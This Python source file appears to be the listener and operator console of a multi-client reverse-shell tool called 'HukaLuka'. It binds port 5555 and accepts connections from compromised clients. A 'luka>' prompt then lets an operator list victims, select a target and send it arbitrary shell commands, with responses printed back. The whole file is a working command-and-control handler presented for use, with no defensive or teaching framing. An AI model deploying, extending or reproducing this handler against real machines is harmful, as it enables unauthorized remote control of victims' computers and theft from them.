#!/usr/bin/python3

import socket
import sys
import os
import threading
import time
from queue import Queue

'''
print(''
'\n******************************************************************'
'\n*                      __          __              __            *'
'\n*        /\  /\       / /         / /             / /            *'
'\n*       / /_/ /_   _ / /__ __    / /       _   _ / /__ __        *'
'\n*      / __  / /__/ /    / - \  / /_____ / /__/ /    / - \       *'
'\n*      \/ /_/______/__/\_\_/\_\/________/______/__/\_\_/\_\      *'
'\n*                                                                *'
'\n* HukaLuka Ver. 7.7                                              *'
'\n* Coded by Aaron, Abdi and Raja                                  *'
'\n******************************************************************\n')
'''

# write data to a log file
def write(data):
    with open('log.txt', 'a') as f:
        f.write(data)

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

# creating socket that will connect computers
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 5555
        s = socket.socket()

    except socket.error as msg:
        print("socket creation error: " + str(msg))


# bind socket and listen for connections
def bind_socket():
    try:
        global host
        global port
        global s
        #print("Binding the Port: " + str(port))
        print("[*] listening as " + str(host) + ':' + str(port))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("socket Binding error" + str(msg) + "\n" + "retrying...")
        bind_socket()

# accept multiple connections
# save them to a list
# close previous connections upon server file restart
def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("connection has been established: " + address[0])
            #print("Client connected "

        except:
            print("error accepting connections")






# interactive prompt
def start_luka():
    
    while True:
        cmd = input('luka> ')
        if cmd == 'list':
            x = list_connections()
            write(x)
        elif 'exit' in cmd:
            sys.exit()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("command not recognized")


# display list of connections with client
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results += str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("\n-----clients-----" + "\n" + results)
    return "\n-----clients-----" + "\n" + results
    #print("\n-------clients-----------" + "\n" + results)
    #return "\n-------clients-----------" + "\n" + results

# select target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # select [target id]
        target = int(target)
        conn = all_connections[target]
        print("you are now connected to: " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> ls

    except:
        print("selection not valid")
        return None


# send commands to client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if cmd == 'exit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# queue that handle connections and send commands
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_luka()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()

create_workers()
create_jobs()
sys.exit()
